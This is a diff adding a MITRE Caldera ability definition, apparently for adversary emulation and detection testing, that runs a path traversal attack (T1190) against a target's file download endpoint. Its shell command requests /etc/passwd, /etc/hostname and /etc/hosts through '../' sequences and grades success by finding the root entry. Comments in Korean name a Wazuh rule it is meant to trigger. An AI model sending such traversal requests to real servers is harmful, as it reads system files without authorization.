@@ -1,0 +1,45 @@
+- id: c4e8f2b1-9d5a-4f7e-b3c6-8a2d1e9f0c4b
+  name: Path Traversal - Text System File Access (Tier 1)
+  description: >-
+    Path traversal text system file access. 공격자 측에서 응답을 파싱해 verdict(pt.verdict)와 근거(pt.evidence.kind)를
+    fact 로 산출한다 (결정1). /etc/passwd 가 노출되면(root:...:0:0:) SUCCEEDED/FILE_DISCLOSED, 404 는 FAILED,
+    5xx 는 EXECUTED. 파일 내용 원문은 기록하지 않는다. 매핑 T1190. 탐지 대상 Wazuh rule 100220.
+    주의: Caldera 는 명령 개행을 제거하므로 각 구문은 ';' 로 종료한다.
+  tactic: initial-access
+  technique:
+    attack_id: T1190
+    name: Exploit Public-Facing Application
+  platforms:
+    linux:
+      sh:
+        command: |-
+          OP_ID="#{paw}";
+          TECH_ID="T1190";
+          ABILITY_ID="c4e8f2b1-9d5a-4f7e-b3c6-8a2d1e9f0c4b";
+          TARGET="http://#{target.url}";
+          H1="X-Caldera-Op-Id: ${OP_ID}";
+          H2="X-Caldera-Technique: ${TECH_ID}";
+          H3="X-Caldera-Ability: ${ABILITY_ID}";
+          UA="Caldera/${OP_ID}/${TECH_ID}/${ABILITY_ID}";
+          get(){ curl -s -m 8 -w "\n__CODE__:%{http_code}" -H "$H1" -H "$H2" -H "$H3" -A "$UA" "${TARGET}/api/files/download?filename=$1"; };
+          RESP=$(get "../../../../etc/passwd");
+          BODY=$(printf '%s' "$RESP" | sed '$d');
+          CODE=$(printf '%s' "$RESP" | tail -n1 | cut -d: -f2);
+          get "../../../../etc/hostname" >/dev/null 2>&1;
+          get "../../../../etc/hosts" >/dev/null 2>&1;
+          V=FAILED; K=none;
+          if printf '%s' "$BODY" | grep -qE "root:.*:0:0:"; then V=SUCCEEDED; K=FILE_DISCLOSED;
+          elif [ "$CODE" = "404" ]; then V=FAILED; K=none;
+          elif [ "$CODE" = "500" ] || [ "$CODE" = "502" ]; then V=EXECUTED; K=none;
+          else V=FAILED; K=none; fi;
+          printf '{"verdict":"%s","evidence_kind":"%s"}\n' "$V" "$K";
+        parsers:
+          plugins.stockpile.app.parsers.json:
+          - source: pt.verdict
+            custom_parser_vals:
+              json_key: verdict
+              json_type: str
+          - source: pt.evidence.kind
+            custom_parser_vals:
+              json_key: evidence_kind
+              json_type: str
